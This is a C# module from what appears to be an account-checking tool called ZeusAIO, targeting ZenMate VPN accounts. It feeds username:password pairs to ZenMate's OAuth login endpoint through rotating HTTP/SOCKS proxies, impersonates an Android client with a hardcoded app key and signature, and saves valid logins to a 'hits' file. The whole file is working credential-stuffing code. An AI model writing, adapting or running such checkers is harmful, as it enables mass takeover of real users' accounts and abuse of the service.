using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Valorant
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.KeepAlive = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("X-APP-KEY", " DgzQUrUj7YrarFjNvzNWlXyRQlRYK0nhmXCh");
                            req.AddHeader("X-MACHINE-ID", " 50d7d6a9511ddaa180f6b950264c52eb");
                            req.AddHeader("X-MACHINE-NAME", " SM-G950U1");
                            req.AddHeader("Authorization", "OAuth oauth_version=\"1.0\", oauth_signature_method=\"PLAINTEXT\", oauth_consumer_key=\"DgzQUrUj7YrarFjNvzNWlXyRQlRYK0nhmXCh\", oauth_signature=\"ubvrWNQQTxOkncckVsIb3JjjlOAW9RQdFedq%26\"");
                            req.AddHeader("Host", " apiv1.zenguard.biz");
                            req.AddHeader("Connection", " close");
                            req.AddHeader("Accept-Encoding", " gzip, deflate");
                            req.UserAgent = "ZM-And/5.0.2.272 (Android 5.1.1; SM-G950U1/dreamqlteue-user 5.1.1 NRD90M 500200516 release-keys/4.0.9+)";
                            string res = req.Post("https://apiv1.zenguard.biz/cg/oauth/access_token?os=android&cid=50d7d6a9511ddaa180f6b950264c52eb&osver=22&partnersId=2&version=5.0.2.272&lng=en&region=US&Country=US", "{\"import\":\"0\",\"x_auth_username\":\"" + s[0] + "\",\"x_auth_mode\":\"client_auth\",\"x_auth_machinename\":\"SM-G950U1\",\"reset\":\"0\",\"x_auth_machineid\":\"50d7d6a9511ddaa180f6b950264c52eb\",\"x_auth_password\":\"" + s[1] + "\"}", "application/json; charset=UTF-8").ToString();
                            if (res.Contains("USER NOT FOUND OR WRONG PASSWORD!"))
                            {
                                break;
                            }
                            else if (res.Contains("MAXIMUM ACTIVATIONS REACHED - RESET REQUIRED"))
                            {
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - ZENMATE] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Zenmate_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }

                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}